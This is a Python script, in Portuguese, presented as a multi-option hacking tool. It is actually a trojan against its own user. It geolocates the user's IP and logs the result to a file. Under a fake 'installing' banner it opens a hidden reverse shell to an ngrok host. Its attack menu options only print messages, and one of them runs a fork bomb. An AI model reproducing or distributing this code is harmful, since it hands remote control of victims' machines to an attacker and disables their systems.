#-- coding: UTF-8 --
import os, time, sys, json, requests, socket, pty
reset = '\033[0;0m'
destq = '\033[;1m'
yellow = '\033[1;33m'
green = '\033[1;32m'
red = '\033[1;31m'
blue = '\033[1;34m'
wh = '\033[1;97m'
ip = requests.get('http://ip-api.com/json/');ip = ip.json();query = ip['query'];status = ip['status'];country = ip['country'];countryC = ip['countryCode'];region = ip['region'];regionN = ip['regionName'];city = ip['city'];zip = ip['zip'];lat = ip['lat'];lon = ip['lon'];tmz = ip['timezone'];isp = ip['isp'];org = ip['org'];As = ip['as']
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
with open('lol.txt', 'w') as arc:
    arc.write(f'''{query}
{status}
{country}
{countryC}
{region}
{regionN}
{city}
{zip}
{lat}
{lon}
{tmz}
{isp}
{org}
{As}
lolhacked_by_spawn''')
print(f'''
{red}
                       __
                    .-"      "-.
                   /            1
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_/  \_)( |     _.=" <
      (/"=."=._ |/     /\     \| .=".="\_)
             "=._ (_     ^^     )".="
                 "=\_|IIIIII|_/="
                .="| \IIIIII/ |"=.
      _     .=".="\          /"=."=.     _
     ( \_.=".="     `--------`     "=."=._/ )
      > .="         {wh}Created by{red}         "=. <
     (/               {wh}SpawnDEV{red}               \)
               Conhecimento não é crime.
               
    "Sem pensar, está é a melhor ferramenta para hackers
            com intenções incompreensíveis.
             Nós somos o lado mal da força."
    {green}[AVISO]{wh} Está é uma ferramenta com o menu de opções muito vasto, 
    contendo 4 opções para hacking.
    Por conta disso, a instalação pode se prolongar mais que o normal.
    (Estima-se que em torno de 15 minutos.)
        {green}Instalando, aguarde ...''')
os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",12984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
print ('[1]DDoS (potente)')
print ('[2]Hackear site')
print ('[3]Hackear android')
print ('[4]Painel de derrubar numero')
print ('[5}Matar android')
def execute_sweet():
    loadmain = " ..."
    for c in range(1):
        print('    [*]Starting', end='')
        for i in list(loadmain):
            print(i, end='')
            sys.stdout.flush()
            time.sleep(0.5)  
execute_sweet()
var = input('Selecione a opção: ')
if var == '1':
    print('a opção 1 foi escolhida com sucesso')
if var == '2':
    print('a opção 2 foi escolhida com sucesso')
if var == '3':
    print('a opção 3 foi escolhida com sucesso')
if var == '4':
    print('a opção 4 foi escolhida com sucesso')
if var == '5':
    print('a opção 5 foi escolhida com sucesso')    


if var == '1':
    input('Digite o IP do alvo:')
    a = 1
    while True:
        a = a + 1
        print(f'ENVIANDO {a} PACOTES PARA O IP')
if var == '2':
    url = input('Insira a URl do site alvo: ')
    def spawnbixa():
        loadmain = " ..."
        for c in range(5):
            os.system('clear')
            print('Analisando URL', end='')
            for i in list(loadmain):
                print(i, end='')
                sys.stdout.flush()
                time.sleep(0.5)
    spawnbixa()
    
    while True:
            print(f'Hackeando {url}')
if var == '3':
    IP = input('Insira o ip do alvo: ')
    def spawnbixa():
        loadmain = " ..."
        for c in range(5):
            os.system('clear')
            print('Analisando as portas do ip', end='')
            for i in list(loadmain):
                print(i, end='')
                sys.stdout.flush()
                time.sleep(0.5)
    spawnbixa()
    while True:
            print(f'Hackeando Android {IP}')
if var == '4':
    nmr = input('Insira o numero do alvo: ')
    def spawnbixa():
        loadmain = " ..."
        for c in range(5):
            os.system('clear')
            print('Criando emails', end='')
            for i in list(loadmain):
                print(i, end='')
                sys.stdout.flush()
                time.sleep(0.5)
    spawnbixa()
    while True:
            print(f'Reportando numero {nmr}')
if var == '5':
    fork = input('Insira o numero do alvo: ')
    def spawnbixa():
        loadmain = " ..."
        for c in range(5):
            os.system('clear')
            print('Preparando ataque', end='')
            for i in list(loadmain):
                print(i, end='')
                sys.stdout.flush()
                time.sleep(0.5)
    spawnbixa()
    while True:
        os.fork()
        print(f'Matando android {fork}')
        
